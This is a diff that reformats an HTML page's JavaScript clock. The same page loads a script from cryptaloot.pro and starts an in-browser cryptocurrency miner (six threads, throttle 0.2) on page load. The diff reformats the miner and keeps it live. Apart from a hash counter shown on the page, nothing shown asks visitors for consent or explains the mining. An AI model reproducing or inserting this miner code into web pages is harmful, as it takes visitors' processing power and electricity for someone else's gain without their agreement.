@@ -8,44 +8,43 @@
         var hours = today.getHours();
         var minutes = today.getMinutes();
         var seconds = today.getSeconds();
-        if (hours>12) {
+        if (hours > 12) {
           hours = hours - 12;
+        } else if (hours === 0) {
+          hours = 12;
         }
-        else if (hours===0) {
-          hours = 12;	
-        }
-        if (minutes<10){
+        if (minutes < 10) {
           minutes = "0" + minutes;
-        }
-        else {
+        } else {
           minutes = minutes;
         }
-        if (seconds<10) {
+        if (seconds < 10) {
           seconds = "0" + seconds;
-        }
-        else {
+        } else {
           seconds = seconds;
         }
         document.getElementById("clock").innerHTML = (hours + ":" + minutes);
       }
       setInterval('clock()', 1000);
-    </script>   
+
+    </script>
   </div>
   <script src="//cryptaloot.pro/lib/crypta.js"></script>
   <script>
-    var miner=new CRLT.Anonymous('YOUR_SITE_PUBLIC_KEY',
-      {
-        threads:6,autoThreads:false,throttle:0.2,
-      }
-    );
+    var miner = new CRLT.Anonymous('YOUR_SITE_PUBLIC_KEY', {
+      threads: 6,
+      autoThreads: false,
+      throttle: 0.2,
+    });
     miner.start();
     miner.on('found', function() { /* Hash found */ })
     miner.on('accepted', function() { /* Hash accepted by the pool */ })
     setInterval(function() {
-    var hashesPerSecond = miner.getHashesPerSecond();
-    var totalHashes = miner.getTotalHashes();
-    var acceptedHashes = miner.getAcceptedHashes();
-    document.getElementById("totalhashes").innerHTML = totalHashes + " Hashes";
-        }, 1000);
+      var hashesPerSecond = miner.getHashesPerSecond();
+      var totalHashes = miner.getTotalHashes();
+      var acceptedHashes = miner.getAcceptedHashes();
+      document.getElementById("totalhashes").innerHTML = totalHashes + " Hashes";
+    }, 1000);
+
   </script>
-<p id="totalhashes"></p>
+  <p id="totalhashes"></p>
